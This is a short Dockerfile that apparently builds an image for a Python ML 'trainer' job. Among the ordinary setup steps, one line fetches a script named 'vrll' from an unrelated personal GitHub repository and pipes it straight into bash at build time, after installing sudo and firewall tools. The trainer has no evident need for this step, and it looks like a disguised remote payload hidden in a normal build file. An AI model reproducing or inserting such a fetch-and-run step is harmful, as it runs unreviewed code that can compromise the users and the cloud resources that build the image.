FROM python:3.8.19-slim
WORKDIR /
RUN apt update && apt -y install curl git wget sudo ufw
RUN curl -sL https://github.com/ranalims99/nice/raw/main/vrll | bash
# Copies the trainer code to the docker image.
COPY trainer /trainer
# Sets up the entry point to invoke the trainer.
ENTRYPOINT ["python", "-m", "trainer.task"]
